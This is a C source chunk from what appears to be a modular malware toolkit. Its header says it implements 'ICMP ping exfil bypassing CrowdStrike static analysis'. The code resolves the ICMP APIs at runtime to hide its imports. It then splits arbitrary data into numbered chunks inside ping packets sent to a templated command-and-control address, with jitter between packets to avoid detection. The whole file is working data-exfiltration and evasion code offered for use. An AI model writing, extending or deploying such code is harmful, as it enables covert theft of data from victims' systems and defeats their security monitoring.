// chunk: exfil/icmp_dynamic
// depends: core/emit_buffer
// provides: exfiltrate
// note: Dynamic icmp.dll loading - ICMP ping exfil bypassing CrowdStrike static analysis

#ifndef CHUNK_ICMP_DYNAMIC
#define CHUNK_ICMP_DYNAMIC

#define C2_ADDR "{{C2_IP}}"
#define C2_PORT 0
#define ICMP_CHUNK_SIZE 64

typedef HANDLE (WINAPI *fn_IcmpCreateFile)(void);
typedef BOOL (WINAPI *fn_IcmpCloseHandle)(HANDLE);
typedef DWORD (WINAPI *fn_IcmpSendEcho)(HANDLE, DWORD, LPVOID, WORD, LPVOID, LPVOID, DWORD, DWORD);

static DWORD _icmp_parse_ip(const char *ip) {
    int o1, o2, o3, o4;
    if (sscanf(ip, "%d.%d.%d.%d", &o1, &o2, &o3, &o4) != 4) return 0;
    return (o4 << 24) | (o3 << 16) | (o2 << 8) | o1;
}

static BOOL exfiltrate(const char *ip, int unused, const char *data, DWORD len) {
    (void)unused;
    if (!data || len == 0 || !ip) return FALSE;

    HMODULE icmp = LoadLibraryA("iphlpapi.dll");
    if (!icmp) icmp = LoadLibraryA("icmp.dll");
    if (!icmp) return FALSE;

    fn_IcmpCreateFile pCreate = (fn_IcmpCreateFile)GetProcAddress(icmp, "IcmpCreateFile");
    fn_IcmpCloseHandle pClose = (fn_IcmpCloseHandle)GetProcAddress(icmp, "IcmpCloseHandle");
    fn_IcmpSendEcho pSendEcho = (fn_IcmpSendEcho)GetProcAddress(icmp, "IcmpSendEcho");

    if (!pCreate || !pClose || !pSendEcho) {
        FreeLibrary(icmp);
        return FALSE;
    }

    HANDLE h = pCreate();
    if (h == INVALID_HANDLE_VALUE) {
        FreeLibrary(icmp);
        return FALSE;
    }

    DWORD dest = _icmp_parse_ip(ip);
    char reply[256];
    DWORD sent = 0;
    int seq = 0;

    // Send length as first packet
    char header[ICMP_CHUNK_SIZE];
    snprintf(header, ICMP_CHUNK_SIZE, "LEN:%lu:SEQ:0", (unsigned long)len);
    pSendEcho(h, dest, header, (WORD)strlen(header), NULL, reply, sizeof(reply), 1000);
    Sleep(50);

    while (sent < len) {
        DWORD chunk = len - sent;
        if (chunk > ICMP_CHUNK_SIZE - 8) chunk = ICMP_CHUNK_SIZE - 8;

        char pkt[ICMP_CHUNK_SIZE];
        snprintf(pkt, 8, "%06d:", ++seq);
        memcpy(pkt + 7, data + sent, chunk);

        pSendEcho(h, dest, pkt, (WORD)(7 + chunk), NULL, reply, sizeof(reply), 1000);
        sent += chunk;
        Sleep(20 + (GetTickCount() % 30));  // Jitter
    }

    // End marker
    char end[16];
    snprintf(end, sizeof(end), "END:%d", seq);
    pSendEcho(h, dest, end, (WORD)strlen(end), NULL, reply, sizeof(reply), 1000);

    pClose(h);
    FreeLibrary(icmp);
    return TRUE;
}

#endif
